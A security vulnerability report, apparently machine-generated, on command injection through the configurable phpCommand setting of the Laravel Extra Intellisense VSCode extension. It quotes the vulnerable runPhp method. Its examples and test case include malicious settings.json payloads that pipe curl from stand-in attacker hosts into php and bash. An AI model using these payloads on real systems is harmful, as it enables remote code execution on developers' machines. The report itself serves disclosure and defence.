# Vulnerability Report

## Vulnerability Name: Arbitrary PHP Command Injection through Configurable PHP Command Execution.

### Description:
- The extension executes PHP commands based on the user's defined `LaravelExtraIntellisense.phpCommand` configuration.
- A developer may carelessly or improperly set this configuration in their VSCode `settings.json` or workspace settings.
- If an attacker manipulates or convinces a developer to introduce a malicious setting (e.g., via crafted `settings.json`, shared repositories, or VSCode settings synchronization), arbitrary malicious PHP code will be executed.
- Specifically, a malicious workspace `.vscode/settings.json` could be crafted by the attacker:
  ```json
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; exec('curl http://maliciousserver.com/shell.php | php');\""
  ```
- Upon the extension triggering Laravel-related PHP execution (e.g., autocomplete processing), the malicious code is invoked, leading to code execution and subsequent compromise.

### Impact:
- Enables arbitrary command and remote code execution on the developer's environment or Docker container associated with Laravel.
- Could lead directly to data compromise, theft of credentials, environment compromise, and acts as a gateway to deeper network exploitation or lateral movement.

### Vulnerability Rank:
Critical

### Currently Implemented Mitigations:
- README "Security Note" explicitly warns users of automatic Laravel application execution and advises temporarily disabling the extension when handling sensitive logic.

### Missing Mitigations:
- No command sanitization or validation process is implemented for the `LaravelExtraIntellisense.phpCommand`.
- No secure handling or limitations on allowed PHP execution contexts exist.
- No preventive measures against injection or malicious settings introduced via workspace configurations exist, allowing arbitrary system execution.

### Preconditions:
- Attacker must gain influence over developers' VSCode configuration (`.vscode/settings.json`, global or workspace settings).
- Developer actively uses the VSCode extension with auto-triggered PHP scenarios.

### Source Code Analysis:
- Code File: `..\vscode-laravel-extra-intellisense\src\helpers.ts`
- Vulnerable Method:
  ```typescript
  static async runPhp(code: string, description: string|null = null) : Promise<string> {
      code = code.replace(/\"/g, "\\\"");
      if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
          code = code.replace(/\$/g, "\\$");
          code = code.replace(/\\\\'/g, '\\\\\\\\\'');
          code = code.replace(/\\\\"/g, '\\\\\\\\\"');
      }
      let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
      let command = commandTemplate.replace("{code}", code);
      let out = new Promise<string>(function (resolve, error) {
          if (description != null) {
              Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
          }

          cp.exec(command,
              { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
              function (err, stdout, stderr) {
                  if (err == null) {
                      if (description != null) {
                          Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                      }
                      resolve(stdout);
                  } else {
                      const errorOutput = stderr.length > 0 ? stderr : stdout;
                      Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                      Helpers.showErrorPopup();
                      error(errorOutput);
                  }
              }
          );
      });
      return out;
  }
  ```
- Walkthrough for triggering this vulnerability:
  1. User-supplied and unsanitized `phpCommand` is fetched directly.
  2. Dynamic replacement `{code}` happens without validation.
  3. Final command infinitely customizable and executed unchecked via `cp.exec`.

### Security Test Case:
1. Craft a malicious repository containing `.vscode/settings.json`:
   ```json
   {
       "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; system('curl https://malicious.example.com/backdoor | bash');\""
   }
   ```
2. Victim developer clones the repository or opens VSCode in that directory.
3. Laravel Extra Intellisense runs PHP code automatically when Laravel autocomplete activates.
4. The malicious command executes immediately and silently downloads and executes attacker implants from the external server (`https://malicious.example.com/backdoor`).
5. Confirm successful exploitation via attacker-controlled listener observing network connections generated from developer's system.

**Note:**
The second vulnerability (Sensitive Data Exposure through Background PHP Execution) from the provided input is ranked "Medium" severity, and consequently, per your provided selection criteria ("exclude vulnerabilities that are not high or critical severity"), it does not meet criteria for inclusion. It will thus not be included here.

---

## Final confirmed list after applying instruction criteria:

| # | Vulnerability Name                                              | Rank       |
|---|-----------------------------------------------------------------|------------|
| 1 | Arbitrary PHP Command Injection through Configurable PHP Command Execution | Critical   |
